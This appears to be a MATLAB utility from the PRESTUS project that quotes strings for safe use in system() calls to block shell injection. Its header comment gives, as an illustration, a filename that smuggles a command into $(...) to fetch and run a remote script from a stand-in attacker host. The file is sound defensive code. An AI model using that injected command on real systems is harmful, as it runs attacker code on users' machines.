function quoted = shell_quote_arg(arg)
% SHELL_QUOTE_ARG  Quote a string as a single literal argument for system().
%
% PRESTUS calls out to external tools (SimNIBS charm, pydeface, ANTs, the
% BabelBrain/jwave Python bridges, ...) by building a command string with
% sprintf() and passing it to MATLAB's system(), which always routes the
% string through a shell (/bin/sh on macOS/Linux, cmd.exe on Windows).
%
% Wrapping a value in double quotes ("%s") is NOT sufficient to make it
% safe: POSIX shells still expand $(...) command substitution, backticks,
% and $VAR inside double quotes. A filename such as
%   ernie.msh.$(curl -s http://attacker:1337 | sh).msh
% scanned from an untrusted directory (e.g. a shared m2m/ segmentation
% folder) and later interpolated into a system() call with "%s" will have
% the embedded command executed by the shell.
%
% This function wraps the argument in single quotes, which POSIX shells
% never expand, and safely escapes any embedded single quotes using the
% standard '\'' technique (close quote, escaped literal quote, reopen
% quote). The result is safe to splice into a system()/sprintf('%s') call
% as one literal argument on macOS and Linux.
%
% Windows note: cmd.exe has no equivalent quoting rule that blocks all
% metacharacters (^, &, |, %%, ...). On Windows this function still
% removes the most common shell-metacharacter risk (double quotes /
% backslash sequences used to break out of a quoted argument) but callers
% that must be safe on Windows should prefer java.lang.ProcessBuilder
% (which passes argument lists directly to CreateProcess without shell
% interpretation) instead of system().
%
% Use as:
%   cmd = sprintf('cp -r %s %s', shell_quote_arg(src), shell_quote_arg(dst));
%   [status, out] = system(cmd);
%
% Input:
%   arg - (1,:) char or string scalar to be used as a single shell argument
%
% Output:
%   quoted - char row vector: arg safely quoted for splicing into a shell
%            command string
%
% See also: SYSTEM

    arguments
        arg (1,:) char
    end

    if ispc
        % cmd.exe: no quoting scheme is fully injection-proof. Strip
        % characters that are used to terminate a quoted argument or
        % chain additional commands, then wrap in double quotes.
        arg = regexprep(arg, '["^&|<>%\n\r]', '');
        quoted = ['"' arg '"'];
        return;
    end

    % POSIX (bash/zsh/sh): close the quote, emit an escaped literal single
    % quote, reopen the quote. This is the standard safe way to embed a
    % literal single quote inside a single-quoted string, and it leaves
    % every other character - including $, `, ;, |, &, (, ), \n - inert.
    quoted = ['''' strrep(arg, '''', '''\''''') ''''];
end
